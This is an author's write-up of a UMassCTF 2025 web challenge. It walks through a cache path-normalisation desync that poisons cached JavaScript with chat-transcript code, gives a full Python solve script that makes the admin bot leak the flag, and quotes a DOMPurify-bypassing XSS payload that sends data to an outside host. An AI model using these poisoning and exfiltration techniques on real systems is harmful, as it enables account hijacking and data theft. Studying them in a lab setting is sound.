---
author: atch2203
pubDatetime: 2025-04-22
title: Bonk4cash author writeup
featured: false
draft: false
tags:
  - cybersec
  - writeups
description: Author writeup for UMassCTF 2025 web challenge
---
Last weekend (April 18-20), the [UMass Cybersecurity Club](https://umasscybersec.org/) hosted [UMassCTF 2025](https://ctftime.org/event/2653). Aside from organizing the challenges for each category, I also wrote my own web challenge, Bonk4Cash. 

My challenge was heavily inspired by [this talk](https://www.youtube.com/watch?v=70yyOMFylUA) by Martin Doyhenard on web cache exploitation, and you can see that reflected in the network diagram.

![altText](@assets/images/bonk4cash/network.jpg)
<div align="center" style="color:#888888">The admin report "path" can be seen going through the cache</div>
Notably, almost everything goes through the cache, including the admin's requests.

Playing around with the application, it seems that there are a few main functionalities:
- registering as a new user with only alphanumeric characters in the username
- sending chat messages via websockets/getting the chat logs from `/transcript`
- playing a scuffed version of 1v1 bonk.io
- viewing the stats of a user at `/stats/username`
- reporting a user at `/report/username`

## Where's the flag?
Let's first see what the goal is here.

<div align="center" style="color:#888888">report endpoint from <code>server.js</code> on the web container</div>

```js
app.post('/report/:username', utils.authMiddleware, async (req, res) => {
  let result;
  let username;
  if(req.user.username === "admin"){
    if(req.params.username !== "admin"){
      result = "User has been banned!";
    }else{
      result = process.env.FLAG;
    }
  }else{
    username = req.params.username;
    const userExists = await client.exists(username);
    if(!userExists){
      result = "User doesn't exist";
    }else if(username === "admin") {
      result = "You can't report the admin!"
    }
    else{
      bot.checkPage(`http://${nginxhost}:${nginxport}/stats/${username}`,client);
      result = "Admin is checking the page!"
    }
  }
  return res.redirect(302, `/?result=${result}`);
})
```

It seems that we need to get the admin to report themselves, and then exfiltrate the flag from the redirect. 

The issue is, reporting a user just goes to the `/stats` page, which (theoretically) shouldn't have any XSS or other vulnerability (this happens to not be true, see <a href="#wrong">"What went wrong"</a>). Additionally, from the network diagram, even if we did have an XSS, we wouldn't be able to exfiltrate the data easily since the `web` container doesn't have access to the internet (once again, this happens to also not be true, see what went wrong again).

## Exploring the suspiciously conspicuous cache
My hope was that players would see the cache and see that they would have to do something with it (since why would it be there otherwise?).

<div align="center" style="color:#888888">get route from <code>cache.py</code> on the cache container</div>

```python
@server.route('/<path:path>')
@server.route('/', defaults={'path':''})
def staticcache(path=""):
    # cache file if it's in /static
    if path.split("/")[0] == "static":
        path = path.split("/", 1)[1]
        filepath = os.path.normpath(f"cache/{path}") if path else "cache/index"
		
        if os.path.isfile(filepath):
            if filepath in expiries and time.time() <= expiries[filepath]+15:
                with open(filepath, 'rb') as file:
	                # print statement added for assistance in understanding
	                print(f"cache hit for {filepath} the following data:")
                    data = file.read()
                    print(data)
                    
                    response = Response(data, 200, [("Content-Type", contentTypes[filepath])])

                    return response

		# the cachefile either doesn't exist or is expired
		# now we make a request to refresh the data
        req = f"http://{webhost}:{webport}/static/{path}"
        resp = r.get(req, data=request.get_data(), headers=request.headers)
	    # print statement added for assistance in understanding
	    print(f"forwarded request to {req}")
  
        with open(filepath, 'wb') as file:
	        # print statement added for assistance in understanding
            print(f"wrote to {filepath} the following data:")
            print(resp.text)
            
            expiry = time.time()
            expiries[filepath] = expiry
            contentTypes[filepath] = resp.raw.headers["Content-Type"]
            file.write(resp.content)
  
        response = Response(resp.content, resp.status_code, [("Content-Type", contentTypes[filepath])])
        return response
  
    # simply pass req through and respond with the same headers
    resp = ... # some code that I copy pasted from stackoverflow
    return response
```

Looking at the caching code, it seems that the cache server is passing through all nonstatic requests, and saving all `/static/foo` requests as a file `./cache/foo`. However, there is this one line that is very out of place and very not necessary for the cache to run:
```python
filepath = os.path.normpath(f"cache/{path}") if path else "cache/index"
# ... 
req = f"http://{webhost}:{webport}/static/{path}"
resp = r.get(req, data=request.get_data(), headers=request.headers)
```

Our cache is normalizing path to write the cache file, but sending the unnormalized path to the application server! This is a desync that we can leverage, so let's try to construct a PoC payload that can get our server to cache the wrong thing in a place we control.

**0th attempt**: `GET /static/stats.js`
```html
cache-1  | forwarding request to http://web:8002/static/stats.js
cache-1  | wrote to cache/stats.js the following data:
cache-1  | ... // normal stats.js content
```
- This is the default behavior; `stats.js` should now be cached in the cache as normal.


**1st attempt**: `GET /static/stats.js/../../register`
```html
cache-1  | forwarding request to http://web:8002/static/stats.js/../../register
cache-1  | wrote to register the following data:
cache-1  | ... // register response content
```
- Now it seems that both the cache normalizes `cache/stats.js/../../register` to just `register`, which explains why it says `wrote to register`
- Additionally, the forwarded request also looks like it's doing path normalization (just like if you put it in your browser), which explains why we get the same response as `http://web:8002/register`


It seems that path normalization works, but where's the desync? Both attempts wrote the response to the same file name, but we want to write to `cache/stats.js` the contents of `http://web:8002/register`. The key here is that the cache write is being ***normalized***, while the forwarded request is being ***parsed as a URL***. They might seem similar, but there's a key difference: `#`/`?`/any other special URL delimiters. Let's try throwing one of those in there.

**2nd attempt**: `GET /static/stats.js?/../register`
```html
cache-1  | forwarding request to http://web:8002/static/stats.js
cache-1  | wrote to cache/stats.js the following data:
cache-1  | ... // stats.js content
```
- This time we get the contents of `/static/stats.js` and write to `cache/stats.js`. What went wrong?
- If you look at the forwarded request, it seems that the cache server is only using `path=/static/stats.js` and ignoring the rest of the URL, leading to the same behavior as our 0th attempt.


If the cache server is already parsing/seeing our `?` delimiter, let's try URL encoding it!

**3rd attempt**: `GET /static/stats.js%3f/../register`
```html
cache-1  | forwarding request to http://web:8002/static/stats.js?/../register
cache-1  | wrote to cache/register the following data:
cache-1  | ... // stats.js content
```
- That's what we're talking about! We got the cache to write the contents of `/static/stats.js` to `cache/register`!
- Here, the cachefile path is being normalized from `cache/stat.js?/../register` to `cache/register`, and the forwarded request has a `?` in it, leading to the `web` container parsing the endpoint as `/static/stats.js`.

Now, we want to reverse the order (ie write contents of `/register` to `cache/stats.js`). All we need to do is just swap register and stats.js.

**4th attempt**: `GET /static/register%3f/../stats.js`
- This time, we get an error `cannot get /static/register`. You can see why: our cache is trying to forward to `http://web:8002/static/register`, which doesn't exist!

**5th attempt**: `GET /static/../register%3f/../stats.js`
```html
cache-1  | forwarding request to http://web:8002/static/../register?/../stats.js
cache-1  | wrote to stats.js the following data:
cache-1  | ... // register content
```
- Nice! we wrote to an arbitrary cache file (`stats.js`) whatever endpoint we wanted (`register`). All that's left is to place the file in the right spot (since we're writing to `./stats.js` and the cache actually stores them in `./cache/stats.js`)

**Final payload**: `GET /static/../register%3f/../cache/stats.js`
```html
cache-1  | forwarding request to http://web:8002/static/../register?/../cache/stats.js
cache-1  | wrote to cache/stats.js the following data:
cache-1  | ... // register content
```
You can see that this is the same behavior as our 0th attempt, except for one key difference: the content of what's being written.


*Side note*: you could also use `GET /static/../register/%3f/../../cache/stats.js` as the payload, why it works is left as an exercise to the reader.
Additionally, using extra `../`s would result in a nginx 400 error: eg `GET /static/../register%3f/../../cache/stats.js` wouldn't work.

## Now what?
All we have now is the ability to poison any cache file with any endpoint we want. Since our admin goes to `/stats/username`, they will load the `stats.js` and `bundle.min.js` file, so we could theoretically poison one of those with a script that requests `/report/admin`.
Well, all of our chat input is being written to `/transcript`, so that seems like a perfect candidate.

The transcript seems to be formatted as follows:
```html
[username] this is the latest message
[username2] this message was sent first
```
We need this to be valid JS, since otherwise the script will error instead of running in the admin's browser.

JS has a list unpacking feature, which can be used as follows:
```js
[var1, var2] = [2, 3]
```
Well, let's apply that here with a list of length 1!
```js
[username] = [2]; // insert malicious js here
```
Now we have a way to run js in the transcript. One issue is that other users also send messages, but we can comment them out as follows:
```js
[me] = [2]; malicious_js_code() /*
[otheruser] normal message that would break js if run
[me] */
```
And we have valid js again!
Since we have the ability to clear the chat at the `/clearchat` endpoint, we can always have our `*/` message be first.

## Putting it all together
Now that we have 
- an arbitrary cache file write with endpoint data
- a way to make the transcript valid JS

All we need to do is make a JS payload that will
1) get the admin to report themselves
2) get the flag from the redirect

There are plenty of ways to do this, but I chose to reuse code from the website, so our chain is as follows:
1) admin visits `/stats/username` with poisoned `stats.js`
2) `stats.js` will force the admin to report the endpoint `/report/admin`
3) admin gets redirected to `/` with the flag, this has poisoned `index.js`
4) `index.js` will send the flag as a message in the chat

The `stats.js` admin reporting poison is pretty simple, and reuses the report button already on the `stats` page:
```js
= [2]; // see previous section on getting valid js
document.addEventListener("DOMContentLoaded",
	function(event){
	  const form = document.getElementsByTagName('form')[0];
	  form.setAttribute("action", "/report/admin");
	  form.submit();
	}
); /*
```

The `index.js` poison is a little more complicated, since we need to get the flag, open a chat websocket, authenticate into the websocket, and send the flag. Still, much of the code is copied over from the normal `index.js` file, since we using the same functionality (get url params, make websocket).
```js
= [2]; //see previous section on getting valid js
// get flag from url params
let queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const result = urlParams.get('result');
let flag;
if(result){
  flag = decodeURI(result);
}

const initChat = async function(){
  // get auth key for chat websocket
  const key = await (await fetch("/chatkey", {method:"post", credentials:'include'})).text();

  // create websocket
  ws = new WebSocket("/chat");
  // when the websocket is opened, authenticate
  ws.onopen = function(event){
    ws.send(key);
  };

  // once websocket has successfuly authorized, send flag
  ws.onmessage = function(event){
    if(event.data === "successfully authorized"){
      ws.send(flag)
    }
  };
};
  
initChat();/*
```

## Final solve script
```python
import requests as r
from websocket import create_connection
import time
import random
import string
import re
  
remote = "localhost"
port = 80
url_base = f"http://{remote}:{port}"
  
s = r.Session();
# create random username and register
username = "".join(random.choice(string.ascii_lowercase) for i in range(20))
resp = s.post(f"{url_base}/register", data={"username": username})
print(resp)

# open chat endpoint, authenticate, clear chat, and send comment end
key = s.post(f"{url_base}/chatkey").text
print(key)
s.post(f"{url_base}/clearchat")
ws = create_connection(f"ws://{remote}:{port}/chat")
ws.send(key)
result = ws.recv()
ws.send("*/")
  
time.sleep(16)
  
  
print("setting up poison for stats.js")
ws.send("""= [2];
        document.addEventListener("DOMContentLoaded",
        function(event){
          const form = document.getElementsByTagName('form')[0];
          form.setAttribute("action", "/report/admin");
          form.submit();
        });/*""")
  
time.sleep(1)
print("poisoning cache")
# weird thing I had to do since python requests parses the url for you
reprep = r.Request(method='GET', url=f"{url_base}/static/../transcript%253f/../cache/stats.js")
prep = reprep.prepare()
prep.url = f"{url_base}/static/../transcript%3f/../cache/stats.js"
s.send(prep)
  
time.sleep(1)
print("setting up poison for index.js")
ws.send(
"""=[4];let queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const result = urlParams.get('result');
let flag;
if(result){
  flag = decodeURI(result);
}
const initChat = async function(){
  const key = await (await fetch("/chatkey", {method:"post", credentials:'include'})).text();
  ws = new WebSocket("/chat");
  ws.onopen = function(event){
    ws.send(key);
  };
  ws.onmessage = function(event){
    if(event.data === "successfully authorized"){
      ws.send(flag)
    }
  };
};
  
initChat();/*"""
)
  
time.sleep(1)
print("poisoning cache")
reprep = r.Request(method='GET', url=f"{url_base}/static/../transcript%253f/../cache/index.js")
prep = reprep.prepare()
prep.url = f"{url_base}/static/../transcript%3f/../cache/index.js"
s.send(prep)
  
print("reporting")
s.post(f"{url_base}/report/{username}")
  
time.sleep(5)

# the admin's message with the flag is also saved in the transcript, so we can get it from there
resp = s.get(f"{url_base}/transcript").text
print(resp)
reg = re.search(r'(UMASS{.*?})',resp).group()
print(reg)
```

Flag: `UMASS{Adm1n_g0T_B0nk3d_EfAv4k7r3dJgTcbjmp}`

## What went wrong?
<div id="wrong"></div>

As I mentioned earlier, there were two main things that went wrong leading to unintended solves:
- an unintentional XSS in the stats page
- all of the containers having internet access

#### Unintentional XSS
I believed that `DOMPurify` would solve all of my XSS troubles, but apparently not.

Since user's messages span lines **and** the `/stats/username` page filters the chat messages *after* the DOMPurify, you could construct a payload that wouldn't get filtered by the DOMPurify after it's run, but would expose an XSS after the filter is taken out:

![altText](@assets/images/bonk4cash/yun.png)
```html
Sanitized log:
[name] test<h1 lang="<br>
[name2] test<img src=1 onerror='/*<br>
[name2] */;alert(1)'>">hello</h1>

Filtered log:
[name2] test<img src=1 onerror='/*<br>
[name2] */;alert(1)'>">hello</h1>
```

![altText](@assets/images/bonk4cash/blaklis.png)
```html
<i data-foo="aaa
[Blaklis10] <img src='http://blakl.is/aaa' onerror='fetch(`/report/admin`,{method:`POST`}).then(r=>fetch(`http://blakl.is/foo?resp=${btoa(r.url)}`))'"></i>
```

Here, the quotes in the outer tag "hide" the `img` tag from being purified, but once `[name]` is filtered out, the `img` tag is exposed to the user, causing XSS.


#### Internet access on containers
You can see in the docker compose file that only the  `nginx` container should have access to the internet, so the admin (on the `web` container) should not have access to the internet. This still is true if you run the source locally, but as always, there were infra issues.
```yaml
services:
  web:
    networks:
      - no-internet
  cache:
    networks:
      - no-internet
  nginx:
    networks:
      - no-internet
      - internet
  db:
    networks:
      - no-internet
	  
networks:
  no-internet:
    driver: bridge
    internal: true
  internet:
    driver: bridge
```
My goal with this is to force players to have to use what's provided (namely, the chat/websockets) to exfiltrate the flag.

However, due to infra issues, our instancer was set up last minute using an AWS ECS that would launch ECS tasks for each instance. The way the ECS tasks were set up, everything had to be run exposed to the internet, which meant that the admin could send data to a webhook.

Combining both of these issues, a player could have gotten a completely unintended solve that used an XSS to exfiltrate through a webhook instead of using cache poisoning to exfiltrate through the chat.

## Thank you for playing in UMassCTF 2025! I hope you learned something new from this challenge/writeup.